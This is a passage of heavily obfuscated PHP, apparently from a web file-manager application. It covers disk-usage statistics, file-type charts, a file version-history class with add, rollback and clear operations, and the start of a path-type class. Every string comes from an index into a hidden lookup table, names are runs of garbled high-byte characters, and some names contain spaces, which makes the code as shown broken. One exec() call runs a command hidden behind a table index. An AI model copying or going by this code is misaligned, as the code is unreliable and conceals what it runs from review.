$this->diskDriver(); $•‘ŒşÆİ = KodIO::defaultDriver(); $ƒöØã´ğ = array($Ş’¸Ûò†[932] => $•‘ŒşÆİ[$Ş’¸Ûò†[495]]); $Éºê¬ÕÒ = Model($Ş’¸Ûò†[568])->where($ƒöØã´ğ)->sum($Ş’¸Ûò†[79]); $íÍ©à£ë = explode($Ş’¸Ûò†[53], $_SERVER[$Ş’¸Ûò†[145]]); $°­ˆ´Ö = $íÍ©à£ë[0]; $ÌÀ òÄ½ = $GLOBALS[$Ş’¸Ûò†[6]][$Ş’¸Ûò†[21]]; $üÊ–ñ— = $ÌÀ òÄ½[$Ş’¸Ûò†[1094]]; if ($üÊ–ñ— == $Ş’¸Ûò†[1082]) { $¦ö¹À = explode($Ş’¸Ûò†[1424], $ÌÀ òÄ½[$Ş’¸Ûò†[1093]]); $üÊ–ñ— = $¦ö¹À[0]; } if ($üÊ–ñ— == $Ş’¸Ûò†[1030] || $üÊ–ñ— == $Ş’¸Ûò†[910]) { $ÚËÙÀû’ = Model()->db()->query($Ş’¸Ûò†[2120]); $÷¢ß²ïø = $ÚËÙÀû’[0] && isset($ÚËÙÀû’[0][$Ş’¸Ûò†[1817]]) ? $ÚËÙÀû’[0][$Ş’¸Ûò†[1817]] : 0; $üÊ–ñ— = $Ş’¸Ûò†[2121] . ($÷¢ß²ïø ? $Ş’¸Ûò†[8] . $÷¢ß²ïø : $Ş’¸Ûò†[12]); } $ÛçÖ½ ê = $GLOBALS[$Ş’¸Ûò†[6]][$Ş’¸Ûò†[434]][$Ş’¸Ûò†[941]]; return array($Ş’¸Ûò†[2122] => $úíÍ¹ ? $úíÍ¹[$Ş’¸Ûò†[2123]] : 0, $Ş’¸Ûò†[2124] => $úíÍ¹ ? $úíÍ¹[$Ş’¸Ûò†[2125]] : 0, $Ş’¸Ûò†[2126] => (int) $•‘ŒşÆİ[$Ş’¸Ûò†[2123]] * 1024 * 1024 * 1024, $Ş’¸Ûò†[2127] => (int) $Éºê¬ÕÒ, $Ş’¸Ûò†[2128] => ucfirst($°­ˆ´Ö), $Ş’¸Ûò†[2129] => $Ş’¸Ûò†[2130] . PHP_VERSION, $Ş’¸Ûò†[2131] => phpBuild64() ? 64 : 32, $Ş’¸Ûò†[865] => str_replace($Ş’¸Ûò†[1256], $Ş’¸Ûò†[1110], $üÊ–ñ—), $Ş’¸Ûò†[434] => ucfirst($ÛçÖ½ ê), $Ş’¸Ûò†[32] => $_SERVER[$Ş’¸Ûò†[2132]]); } private function diskDriver() { $ì‰—‡² =& $_SERVER[‘ÆÜ‘œ]; $ì³›à–˜ = $ì‰—‡²[8]; $õĞ¯«åñ = $GLOBALS[$ì‰—‡²[6]][$ì‰—‡²[1448]] == $ì‰—‡²[1449]; if ($õĞ¯«åñ) { $ì³›à–˜ = $ì‰—‡²[2133]; if (function_exists($ì‰—‡²[2134])) { exec($ì‰—‡²[2135], $¸Õ…õ³Ã); $ì³›à–˜ = $¸Õ…õ³Ã[1] . $ì‰—‡²[8]; } } if (!file_exists($ì³›à–˜)) { return; } if (!function_exists($ì‰—‡²[2136])) { return; } $øÙ¢Òˆ€ = @disk_total_space($ì³›à–˜); $úÏšêö = $øÙ¢Òˆ€ - @disk_free_space($ì³›à–˜); return array($ì‰—‡²[2123] => $øÙ¢Òˆ€, $ì‰—‡²[2125] => $úÏšêö); } public function fileChart($³€€ê‘æ) { $¸ÓŒßÎÙ =& $_SERVER[‘ÆÜ‘œ]; if (isset($³€€ê‘æ[$¸ÓŒßÎÙ[1544]])) { return Model($¸ÓŒßÎÙ[939])->userFileTypeProfile($³€€ê‘æ[$¸ÓŒßÎÙ[1544]]); } if (isset($³€€ê‘æ[$¸ÓŒßÎÙ[1446]])) { return Model($¸ÓŒßÎÙ[939])->groupFileTypeProfile($³€€ê‘æ[$¸ÓŒßÎÙ[1446]]); } $ ‚ÖÏ¨õ = $this->sourceSize(); $”ØíÍØİ = array($¸ÓŒßÎÙ[191] => 0, $¸ÓŒßÎÙ[189] => 1); $ïÓÖó” = Model($¸ÓŒßÎÙ[939])->where($”ØíÍØİ)->sum($¸ÓŒßÎÙ[79]); $”ØíÍØİ[$¸ÓŒßÎÙ[189]] = 2; $·“ğÀ“Ğ = Model($¸ÓŒßÎÙ[939])->where($”ØíÍØİ)->sum($¸ÓŒßÎÙ[79]); return array($¸ÓŒßÎÙ[871] => $ ‚ÖÏ¨õ[$¸ÓŒßÎÙ[79]], $¸ÓŒßÎÙ[2073] => $ ‚ÖÏ¨õ[$¸ÓŒßÎÙ[2073]], $¸ÓŒßÎÙ[2074] => (int) $ïÓÖó”, $¸ÓŒßÎÙ[2075] => (int) $·“ğÀ“Ğ); } private function sourceSize() { $¤ü“Çİæ =& $_SERVER[‘ÆÜ‘œ]; $ŒòÂÜÄê = Model($¤ü“Çİæ[939])->where(array($¤ü“Çİæ[508] => 0))->sum($¤ü“Çİæ[79]); $¿â³‚é½ = Model($¤ü“Çİæ[568])->sum($¤ü“Çİæ[79]); if ($¿â³‚é½ > $ŒòÂÜÄê) { $¿â³‚é½ = $ŒòÂÜÄê; } return array($¤ü“Çİæ[79] => (int) $ŒòÂÜÄê, $¤ü“Çİæ[2073] => (int) $¿â³‚é½); } } goto d¥Æ°Û‰ĞŠ; cßö™¤ôÍ¶: define($_SERVER[‘ÆÜ‘œ][318], 3); define($_SERVER[‘ÆÜ‘œ][319], 1); define($_SERVER[‘ÆÜ‘œ][320], 0); goto A×ÀÀ·Íƒ™; d—òñ¦ˆğ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $©¯Êö«¸ =& $_SERVER[‘ÆÜ‘œ]; $ıêÄ¤Æ“ = $GLOBALS[$©¯Êö«¸[6]][$©¯Êö«¸[92]]; if ($ıêÄ¤Æ“[$©¯Êö«¸[1355]] != 1) { return; } if ($ıêÄ¤Æ“[$©¯Êö«¸[1356]] <= 0) { return; } if (isset($_REQUEST[$©¯Êö«¸[1357]]) && $_REQUEST[$©¯Êö«¸[1357]] == $©¯Êö«¸[91]) { return; } Hook::bind($©¯Êö«¸[1358], $©¯Êö«¸[1359]); Hook::bind($©¯Êö«¸[1360], $©¯Êö«¸[1361]); Hook::bind($©¯Êö«¸[1362], $©¯Êö«¸[1363]); Hook::bind($©¯Êö«¸[1364], $©¯Êö«¸[1365]); Hook::bind($©¯Êö«¸[1366], $©¯Êö«¸[1367]); Hook::bind($©¯Êö«¸[1368], $©¯Êö«¸[1369]); } public static function eventBeforeUpload($ëÇ…‡çÃ) { if ($ëÇ…‡çÃ[3] && $ëÇ…‡çÃ[3] != REPEAT_REPLACE) { return; } $²»ÄãñÙ = self::parsePath($ëÇ…‡çÃ[0]); if (!$²»ÄãñÙ) { return; } self::add($²»ÄãñÙ); } public static function eventBeforeEdit($‘ï¦ı…Ò) { $Ÿ½Â…ÑÂ = self::parsePath($‘ï¦ı…Ò[0]); if (!$Ÿ½Â…ÑÂ) { return; } self::add($Ÿ½Â…ÑÂ); } public static function eventBeforeCopyFile($ş§»ÀÁÆ, $½¸£ûÛÏ, $¸“±Ş, $à£şâïµ, $³Ëî ‚Ë, $Ûü¡ä‹Ğ) { $·¢Ÿî™ =& $_SERVER[‘ÆÜ‘œ]; if (isset($¸“±Ş->_data[$·¢Ÿî™[1289]]) && $¸“±Ş->_data[$·¢Ÿî™[1289]]) { return; } $¦ŞÏÌÎ¿ = $¸“±Ş->getPathOuter($à£şâïµ); $À„‹ş˜€ = self::parsePath($¦ŞÏÌÎ¿); if (!$À„‹ş˜€) { return; } self::add($À„‹ş˜€); } public static function eventBeforeRename($ö´ßÒ°‹) { $É˜ú‹£Ö =& $_SERVER[‘ÆÜ‘œ]; $Ÿ’‘å‚ = self::parsePath($ö´ßÒ°‹[0]); if (!$Ÿ’‘å‚) { return; } $úîèãïÛ = self::checkInHistory($Ÿ’‘å‚); if (!$úîèãïÛ) { return; } if ($úîèãïÛ[$É˜ú‹£Ö[33]] == $É˜ú‹£Ö[231]) { $–ƒ¾Ñ•‹ = self::listData($Ÿ’‘å‚); if ($–ƒ¾Ñ•‹ && $–ƒ¾Ñ•‹[$É˜ú‹£Ö[455]]) { self::moveHistory($Ÿ’‘å‚, $ö´ßÒ°‹[1]); } } else { IO::rename($úîèãïÛ[$É˜ú‹£Ö[87]], $ö´ßÒ°‹[1]); } } public static function eventBeforeMove($Õ´êÕ×) { $ƒğÑ¾Íœ =& $_SERVER[‘ÆÜ‘œ]; $ÌÁƒ ¶ = self::parsePath($Õ´êÕ×[0]); if (!$ÌÁƒ ¶) { return; } $­ş‚·¸ = self::parsePath($Õ´êÕ×[1]); if (!$­ş‚·¸) { return; } $„ÓğÙÑ  = $Õ´êÕ×[3]; $ğîõä™ = self::checkInHistory($ÌÁƒ ¶); if (!$ğîõä™) { return; } $Àøã¿”Ğ = self::pathHistory($­ş‚·¸); if ($ğîõä™[$ƒğÑ¾Íœ[33]] == $ƒğÑ¾Íœ[231]) { $»‹÷±Şè = self::listData($ÌÁƒ ¶); $Šñõ×Ü = rtrim($­ş‚·¸, $ƒğÑ¾Íœ[8]) . $ƒğÑ¾Íœ[8] . ($„ÓğÙÑ  ? $„ÓğÙÑ  : get_path_this($ÌÁƒ ¶)); $¨‡ÅÓ¥ = self::listData($Šñõ×Ü); if ($»‹÷±Şè && $»‹÷±Şè[$ƒğÑ¾Íœ[455]] && $¨‡ÅÓ¥ && $¨‡ÅÓ¥[$ƒğÑ¾Íœ[455]]) { return self::clear($ÌÁƒ ¶); } if ($»‹÷±Şè && $»‹÷±Şè[$ƒğÑ¾Íœ[455]]) { self::moveHistory($ÌÁƒ ¶, $„ÓğÙÑ , $Àøã¿”Ğ); } } else { IO::move($ğîõä™[$ƒğÑ¾Íœ[87]], $Àøã¿”Ğ, !1, $„ÓğÙÑ ); self::clearEmptyFolder(IO::pathFather($ğîõä™[$ƒğÑ¾Íœ[87]])); } } public static function eventAfterRemove($²ŞÓĞó, $ÃÅ¸¢Ğ) { $ã•‘ŒÆ³ =& $_SERVER[‘ÆÜ‘œ]; if (!$ÃÅ¸¢Ğ) { return; } $ÉêƒŞ…– = self::parsePath($²ŞÓĞó[0]); if (!$ÉêƒŞ…–) { return; } $ó…ó‘ = self::checkInHistory($ÉêƒŞ…–); if (!$ó…ó‘) { return; } if ($ó…ó‘[$ã•‘ŒÆ³[33]] == $ã•‘ŒÆ³[231]) { $ãóôì¶˜ = self::listData($ÉêƒŞ…–, !1); if ($ãóôì¶˜ && $ãóôì¶˜[$ã•‘ŒÆ³[455]]) { self::clear($ÉêƒŞ…–, !1); } } else { IO::remove($ó…ó‘[$ã•‘ŒÆ³[87]]); self::clearEmptyFolder(IO::pathFather($ó…ó‘[$ã•‘ŒÆ³[87]])); } } private static function checkInHistory($şÒÀŞÔš) { $¿éÔ•™• = self::pathHistory($şÒÀŞÔš); if (!IO::exist($¿éÔ•™•)) { $¿éÔ•™• .= $_SERVER[‘ÆÜ‘œ][1370]; } return IO::exist($¿éÔ•™•) ? IO::info($¿éÔ•™•) : !1; } private static function parsePath($Ş»ƒªâö) { $›ñ–©ù· =& $_SERVER[‘ÆÜ‘œ]; if (!$Ş»ƒªâö) { return !1; } if (isset($GLOBALS[$›ñ–©ù·[1371]]) && $GLOBALS[$›ñ–©ù·[1371]]) { return; } $Ä÷ŸÜ²» = KodIO::parse($Ş»ƒªâö); $ñ³ºê™Í = $Ä÷ŸÜ²»[$›ñ–©ù·[33]]; $–•ƒŸ©ğ = !$ñ³ºê™Í || $ñ³ºê™Í == KodIO::KOD_IO || $ñ³ºê™Í == KodIO::KOD_SHARE_ITEM; if (!$–•ƒŸ©ğ || !$Ä÷ŸÜ²»[$›ñ–©ù·[1372]]) { return !1; } if (substr($Ş»ƒªâö, 0, strlen(DATA_PATH . $›ñ–©ù·[1373])) == DATA_PATH . $›ñ–©ù·[1373]) { return !1; } if ($ñ³ºê™Í == KodIO::KOD_SHARE_ITEM) { $²ËÀÕ = IO::init($Ş»ƒªâö); if ($²ËÀÕ->pathParse[$›ñ–©ù·[1285]]) { return self::parsePath($²ËÀÕ->pathParse[$›ñ–©ù·[1285]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $†äî’  = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $›ñ–©ù·[1374]); foreach ($†äî’  as $±¥¹æ®•) { if (!$ñ³ºê™Í && substr($Ş»ƒªâö, 0, strlen($±¥¹æ®•)) == $±¥¹æ®•) { return !1; } } self::log($GLOBALS[$›ñ–©ù·[1279]] . $›ñ–©ù·[1375] . $Ş»ƒªâö); return $Ş»ƒªâö; } private static function pathHistory($¹ÓÛµ¸¬) { $ŠÄ„¶¼Á =& $_SERVER[‘ÆÜ‘œ]; $¹šÈßú® = self::$_historyBase . ltrim(KodIO::clear($¹ÓÛµ¸¬), $ŠÄ„¶¼Á[8]); $¹šÈßú® = str_replace(array($ŠÄ„¶¼Á[1376]), array($ŠÄ„¶¼Á[1377]), $¹šÈßú®); return $¹šÈßú®; } public static function log($ÂµÛÌñ) { } public static function historyCount($¬™Ô‚Ş‚) { $şÑ‹×° =& $_SERVER[‘ÆÜ‘œ]; $æ¼Şüè‰ = array(); $›øê²ñë = array(); foreach ($¬™Ô‚Ş‚ as $æãı—¡) { $·÷Ù¾² = get_path_father($æãı—¡); if (!$›øê²ñë[$·÷Ù¾²]) { $›øê²ñë[$·÷Ù¾²] = array(); } $›øê²ñë[$·÷Ù¾²][] = get_path_this($æãı—¡); } foreach ($›øê²ñë as $·÷Ù¾² => $ô±¶«¢ç) { $«ÀÎ²¾Ì = self::parsePath($·÷Ù¾²); if (!$«ÀÎ²¾Ì) { continue; } foreach ($ô±¶«¢ç as $½¶Šé¨ï) { $ŒÁ’Î‘Ê = self::listData(rtrim($«ÀÎ²¾Ì, $şÑ‹×°[8]) . $şÑ‹×°[8] . $½¶Šé¨ï, !1); if ($ŒÁ’Î‘Ê && $ŒÁ’Î‘Ê[$şÑ‹×°[455]]) { $æ¼Şüè‰[rtrim($·÷Ù¾², $şÑ‹×°[8]) . $şÑ‹×°[8] . $½¶Šé¨ï] = count($ŒÁ’Î‘Ê[$şÑ‹×°[455]]); } } } return $æ¼Şüè‰; } public static function add($ôÈ“Å¤‰) { $àşú€¼˜ =& $_SERVER[‘ÆÜ‘œ]; $Â’øè“Š = self::listData($ôÈ“Å¤‰); if (!$Â’øè“Š) { return; } $´æ‚ŞÑµ = Model($àşú€¼˜[880])->get($àşú€¼˜[1378]); $ëÉÖ¦«Ø = intval($GLOBALS[$àşú€¼˜[6]][$àşú€¼˜[92]][$àşú€¼˜[1356]]); $ºˆŸÀÑÂ = $´æ‚ŞÑµ == $àşú€¼˜[1379] ? min(5, $ëÉÖ¦«Ø) : $ëÉÖ¦«Ø; if ($ëÉÖ¦«Ø <= 0) { return; } $“¡¸„˜Ì = IO::info($ôÈ“Å¤‰); $Ì¹®…Ê˜ = $Â’øè“Š[$àşú€¼˜[455]]; if ($“¡¸„˜Ì[$àşú€¼˜[79]] == 0) { return; } if ($“¡¸„˜Ì[$àşú€¼˜[79]] >= 1024 * 1024 * 500) { return !1; } $‰·«š›¹ = IO::hashSimple($ôÈ“Å¤‰); if ($Ì¹®…Ê˜ && $Ì¹®…Ê˜[0][$àşú€¼˜[702]] == $‰·«š›¹) { return !0; } if (array_key_exists($àşú€¼˜[234], $“¡¸„˜Ì) && !$“¡¸„˜Ì[$àşú€¼˜[234]]) { return !1; } $ôµŠÍª‚ = short_id(time()); $£ƒÙşï½ = array($àşú€¼˜[495] => $ôµŠÍª‚, $àşú€¼˜[702] => $‰·«š›¹, $àşú€¼˜[32] => $“¡¸„˜Ì[$àşú€¼˜[32]] . $àşú€¼˜[10] . date($àşú€¼˜[1380]) . rand_string(1), $àşú€¼˜[79] => $“¡¸„˜Ì[$àşú€¼˜[79]], $àşú€¼˜[549] => USER_ID, $àşú€¼˜[232] => time(), $àşú€¼˜[1381] => $àşú€¼˜[12]); IO::mkdir($Â’øè“Š[$àşú€¼˜[1382]]); $‘³¨¦ÏÉ = IO::copy($ôÈ“Å¤‰, $Â’øè“Š[$àşú€¼˜[1382]], !1, $£ƒÙşï½[$àşú€¼˜[32]]); if (!$‘³¨¦ÏÉ) { self::clearEmptyFolder($Â’øè“Š[$àşú€¼˜[1382]]); return !1; } array_unshift($Ì¹®…Ê˜, $£ƒÙşï½); if (count($Ì¹®…Ê˜) > $ºˆŸÀÑÂ) { $ÛŞÄâ«­ = array_slice($Ì¹®…Ê˜, $ºˆŸÀÑÂ); foreach ($ÛŞÄâ«­ as $ÁŞÎÂŸ¬) { IO::remove($Â’øè“Š[$àşú€¼˜[1382]] . $ÁŞÎÂŸ¬[$àşú€¼˜[32]]); } $Ì¹®…Ê˜ = array_slice($Ì¹®…Ê˜, 0, $ºˆŸÀÑÂ); } return self::saveData($Â’øè“Š[$àşú€¼˜[1383]], $Ì¹®…Ê˜); } public static function remove($¦Ï–ô—…, $›ËĞ§¥Ü) { $Ş™®˜Æü =& $_SERVER[‘ÆÜ‘œ]; $ÓîÙÖçñ = self::listData($¦Ï–ô—…); $‘”·¬®É = array(); if (!$ÓîÙÖçñ) { return !1; } foreach ($ÓîÙÖçñ[$Ş™®˜Æü[455]] as $â¬†ä ¤) { if ($â¬†ä ¤[$Ş™®˜Æü[495]] == $›ËĞ§¥Ü) { IO::remove($ÓîÙÖçñ[$Ş™®˜Æü[1382]] . $â¬†ä ¤[$Ş™®˜Æü[32]]); continue; } $‘”·¬®É[] = $â¬†ä ¤; } return self::saveData($ÓîÙÖçñ[$Ş™®˜Æü[1383]], $‘”·¬®É); } public static function clear($ôşÜ‚‚ª, $çˆ¥û˜è = true) { $±³Ïß™ =& $_SERVER[‘ÆÜ‘œ]; $Ğà½ÚÄ = self::listData($ôşÜ‚‚ª, $çˆ¥û˜è); if (!$Ğà½ÚÄ) { return !1; } foreach ($Ğà½ÚÄ[$±³Ïß™[455]] as $ÔÁÇ¬â£) { IO::remove($Ğà½ÚÄ[$±³Ïß™[1382]] . $ÔÁÇ¬â£[$±³Ïß™[32]]); } return self::saveData($Ğà½ÚÄ[$±³Ïß™[1383]], array()); } public static function moveHistory($ëÙĞ‰’, $Û²æİê = '', $×£×Ï’È = '') { $ùÕËˆıá =& $_SERVER[‘ÆÜ‘œ]; $¹ÎÀ²§ = self::listData($ëÙĞ‰’, !1); if (!$¹ÎÀ²§ || !$¹ÎÀ²§[$ùÕËˆıá[455]]) { return !1; } $˜ËÀ±Êğ = $ùÕËˆıá[1370]; $Û²æİê = $Û²æİê ? $Û²æİê : get_path_this($ëÙĞ‰’); $×£×Ï’È = $×£×Ï’È ? $×£×Ï’È : $¹ÎÀ²§[$ùÕËˆıá[1382]]; $·İ™ÒÔê = substr(get_path_this($¹ÎÀ²§[$ùÕËˆıá[1383]]), 0, -strlen($˜ËÀ±Êğ)); foreach ($¹ÎÀ²§[$ùÕËˆıá[455]] as $‚Œìá•È => $†å“ÚÈ¢) { $ñõê¬ÎÛ = $Û²æİê . substr($†å“ÚÈ¢[$ùÕËˆıá[32]], strlen($·İ™ÒÔê)); $ìâæ”ü = IO::move($¹ÎÀ²§[$ùÕËˆıá[1382]] . $†å“ÚÈ¢[$ùÕËˆıá[32]], $×£×Ï’È, !1, $ñõê¬ÎÛ); if ($ìâæ”ü) { $¹ÎÀ²§[$ùÕËˆıá[455]][$‚Œìá•È][$ùÕËˆıá[32]] = $ñõê¬ÎÛ; } } $¹ÎÀ²§[$ùÕËˆıá[1383]] = IO::move($¹ÎÀ²§[$ùÕËˆıá[1383]], $×£×Ï’È, !1, $Û²æİê . $˜ËÀ±Êğ); self::saveData($¹ÎÀ²§[$ùÕËˆıá[1383]], $¹ÎÀ²§[$ùÕËˆıá[455]]); self::clearEmptyFolder($¹ÎÀ²§[$ùÕËˆıá[1382]]); } public static function rollback($Ê ÁÅŒÒ, $¹†÷Ç®) { $º®¸Ä·¸ =& $_SERVER[‘ÆÜ‘œ]; $±œä†á = self::listData($Ê ÁÅŒÒ); if (!$±œä†á) { return; } $çÑ„ù©› = IO::info($Ê ÁÅŒÒ); foreach ($±œä†á[$º®¸Ä·¸[455]] as $Œğ×àÖ => $Æ‚™º—å) { if ($Æ‚™º—å[$º®¸Ä·¸[495]] == $¹†÷Ç®) { self::add($Ê ÁÅŒÒ); $¨™‚×·­ = $±œä†á[$º®¸Ä·¸[1382]] . $Æ‚™º—å[$º®¸Ä·¸[32]]; $½Äâ¤Ì¯ = IO::copy($¨™‚×·­, IO::pathFather($Ê ÁÅŒÒ), REPEAT_REPLACE, $çÑ„ù©›[$º®¸Ä·¸[32]]); if ($½Äâ¤Ì¯) { self::remove($Ê ÁÅŒÒ, $¹†÷Ç®); } return $½Äâ¤Ì¯; } } return !1; } public static function setDetail($ ¡¸â«†, $‹ØÓíØ², $Š½·°İ) { $Êïé”ò =& $_SERVER[‘ÆÜ‘œ]; $ÌùğÀîÂ = self::listData($ ¡¸â«†); if (!$ÌùğÀîÂ) { return; } foreach ($ÌùğÀîÂ[$Êïé”ò[455]] as $¸§ÙÜ => $‡Î†¹‘) { if ($‡Î†¹‘[$Êïé”ò[495]] == $‹ØÓíØ²) { $ÌùğÀîÂ[$Êïé”ò[455]][$¸§ÙÜ][$Êïé”ò[1381]] = $Š½·°İ; self::saveData($ÌùğÀîÂ[$Êïé”ò[1383]], $ÌùğÀîÂ[$Êïé”ò[455]]); return !0; } } return !1; } public static function fileInfo($ÀñôŠü, $¯ºš¨ñÜ) { $ú´’è¾ =& $_SERVER[‘ÆÜ‘œ]; $±øˆ¥® = self::listData($ÀñôŠü); if (!$±øˆ¥®) { show_json(LNG($ú´’è¾[106]), !1); } $ŞÌê³¾’ = $ú´’è¾[12]; foreach ($±øˆ¥®[$ú´’è¾[455]] as $ˆë´‡Íâ => $ºÃ÷£ÃÉ) { if ($ºÃ÷£ÃÉ[$ú´’è¾[495]] != $¯ºš¨ñÜ) { continue; } $ŞÌê³¾’ = $±øˆ¥®[$ú´’è¾[1382]] . $ºÃ÷£ÃÉ[$ú´’è¾[32]]; break; } if (!$ŞÌê³¾’) { show_json(LNG($ú´’è¾[106]), !1); } return IO::info($ŞÌê³¾’); } public static function fileOut($¯ÚÆ‹õ’, $ëŸîèŠš, $•¿ú¤²Ø = false) { $ÆğöôŞ¿ =& $_SERVER[‘ÆÜ‘œ]; $û‰•ò®© = self::fileInfo($¯ÚÆ‹õ’, $ëŸîèŠš); $ßÊ¡¹ ¤ =& $GLOBALS[$ÆğöôŞ¿[7]]; $•¿ú¤²Ø = isset($ßÊ¡¹ ¤[$ÆğöôŞ¿[1333]]) && $ßÊ¡¹ ¤[$ÆğöôŞ¿[1333]] == 1; if (isset($ßÊ¡¹ ¤[$ÆğöôŞ¿[33]]) && $ßÊ¡¹ ¤[$ÆğöôŞ¿[33]] == $ÆğöôŞ¿[1384]) { return IO::fileOutImage($û‰•ò®©[$ÆğöôŞ¿[87]], $ßÊ¡¹ ¤[$ÆğöôŞ¿[1385]]); } IO::fileOut($û‰•ò®©[$ÆğöôŞ¿[87]], $•¿ú¤²Ø, get_path_this($¯ÚÆ‹õ’)); } public static function listData($¿ŸÉÉ¦¯, $Ì¥‡œòÀ = true) { $Ï˜íâ©ô =& $_SERVER[‘ÆÜ‘œ]; if ($Ì¥‡œòÀ && !IO::exist($¿ŸÉÉ¦¯)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($¿ŸÉÉ¦¯, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $è›‘Áæ = self::pathHistory($¿ŸÉÉ¦¯); $ºŠ©ç¤Ê = array($Ï˜íâ©ô[1383] => $è›‘Áæ . $Ï˜íâ©ô[1370], $Ï˜íâ©ô[1382] => rtrim(get_path_father($è›‘Áæ), $Ï˜íâ©ô[8]) . $Ï˜íâ©ô[8], $Ï˜íâ©ô[455] => array()); $¦‰‹çÖ­ = IO::getContent($ºŠ©ç¤Ê[$Ï˜íâ©ô[1383]]); if ($¦‰‹çÖ­) { $‰Õ’ İ = json_decode($¦‰‹çÖ­, !0); if (is_array($‰Õ’ İ)) { $ºŠ©ç¤Ê[$Ï˜íâ©ô[455]] = $‰Õ’ İ; } } return $ºŠ©ç¤Ê; } private static function saveData($©éåØœ, $âõ²Êâª) { $ó½‡ß…¥ =& $_SERVER[‘ÆÜ‘œ]; self::log($ó½‡ß…¥[1386] . $©éåØœ . $ó½‡ß…¥[74] . count($âõ²Êâª), $ó½‡ß…¥[859]); if ($âõ²Êâª) { return IO::setContent($©éåØœ, json_encode($âõ²Êâª)); } $ú¾Œ´Ğ = IO::pathFather($©éåØœ); IO::remove($©éåØœ); self::clearEmptyFolder($ú¾Œ´Ğ); return !0; } public static function clearEmptyFolder($¼³Ü‡ÁÊ) { $êöãèÏ€ =& $_SERVER[‘ÆÜ‘œ]; if (trim($¼³Ü‡ÁÊ, $êöãèÏ€[8]) == trim(self::$_historyBase, $êöãèÏ€[8])) { return; } $´í»ˆÑÇ = IO::pathFather($¼³Ü‡ÁÊ); $†…İä“ß = IO::has($¼³Ü‡ÁÊ, !0); if ($†…İä“ß[$êöãèÏ€[240]] > 0 || $†…İä“ß[$êöãèÏ€[241]] > 0) { return; } IO::remove($¼³Ü‡ÁÊ); self::clearEmptyFolder($´í»ˆÑÇ); } private static function getBasePath() { $¶µ“¤ˆ =& $_SERVER[‘ÆÜ‘œ]; $Ø·„§À = Model($¶µ“¤ˆ[1387])->get($¶µ“¤ˆ[1388]); if ($Ø·„§À) { if (!IO::exist($Ø·„§À)) { IO::mkdir($Ø·„§À); } if (get_path_this($Ø·„§À) == $¶µ“¤ˆ[1373]) { $­õ…¹Ğƒ = $¶µ“¤ˆ[1389] . rand_string(8); @rename($Ø·„§À, get_path_father($Ø·„§À) . $¶µ“¤ˆ[8] . $­õ…¹Ğƒ); $Ø·„§À = DATA_PATH . $­õ…¹Ğƒ . $¶µ“¤ˆ[8]; file_put_contents(DATA_PATH . $¶µ“¤ˆ[1321], $¶µ“¤ˆ[12]); Model($¶µ“¤ˆ[1387])->set($¶µ“¤ˆ[1388], $Ø·„§À); } return $Ø·„§À; } $Ø·„§À = DATA_PATH . $¶µ“¤ˆ[1389] . rand_string(8) . $¶µ“¤ˆ[8]; $Ø·„§À = IO::mkdir($Ø·„§À); $Ø·„§À = rtrim($Ø·„§À, $¶µ“¤ˆ[8]) . $¶µ“¤ˆ[8]; file_put_contents($Ø·„§À . $¶µ“¤ˆ[1321], $¶µ“¤ˆ[12]); file_put_contents(DATA_PATH . $¶µ“¤ˆ[1321], $¶µ“¤ˆ[12]); Model($¶µ“¤ˆ[1387])->set($¶µ“¤ˆ[1388], $Ø·„§À); return $Ø·„§À; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\143\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\x52\145\x63\171\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\151\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\162\x46\151\154\145\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\x70\x52\157\157\x74\123\145\154\x66\175"; const KOD_USER_SHARE = "\173\x75\163\145\162\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\x68\141\x72\145\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\x72\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\x72\x65\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\111\164\x65\x6d\x4c\x69\x6e\x6b\x7d"; const KOD_SHARE_OUTER = "\173\163\150\x61\x72\x65\x49\164\145\x6d\x4f\x75\164\x7d"; const KOD_SEARCH = "\173\x73\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\157\143\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\173\165\x73\x65\x72\122\x65\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\x69\x76\145\162\175"; public static function typeList() { $Î®ÜàŸ” =& $_SERVER[‘ÆÜ‘œ]; return array($Î®ÜàŸ”[1390] => self::KOD_SOURCE, $Î®ÜàŸ”[1391] => self::KOD_USER_RECYCLE, $Î®ÜàŸ”[1392] => self::KOD_USER_FAV, $Î®ÜàŸ”[1393] => self::KOD_USER_FILE_TAG, $Î®ÜàŸ”[1394] => self::KOD_USER_FILE_TYPE, $Î®ÜàŸ”[1395] => self::KOD_GROUP_ROOT_SELF, $Î®ÜàŸ”[1396] => self::KOD_USER_SHARE, $Î®ÜàŸ”[1397] => self::KOD_USER_SHARE_LINK, $Î®ÜàŸ”[1398] => self::KOD_USER_SHARE_TO_ME, $Î®ÜàŸ”[1399] => self::KOD_SHARE_ITEM, $Î®ÜàŸ”[1400] => self::KOD_SHARE_LINK, $Î®ÜàŸ”[1401] => self::KOD_SHARE_OUTER, $Î®ÜàŸ”[1402] => self::KOD_SEARCH, $Î®ÜàŸ”[1403] => self::KOD_BLOCK, $Î®ÜàŸ”[1404] => self::KOD_IO, $Î®ÜàŸ”[1405] => self::KOD_USER_RECENT, $Î®ÜàŸ”[1406] => self::KOD_USER_DRIVER); } public static function parse($ãÇŸ˜£¡) { $ ÕÒÎ¨ó =& $_SERVER[‘ÆÜ‘œ]; $ãÇŸ˜£¡ = self::clear($ãÇŸ˜£¡); $ãç¢¼ = 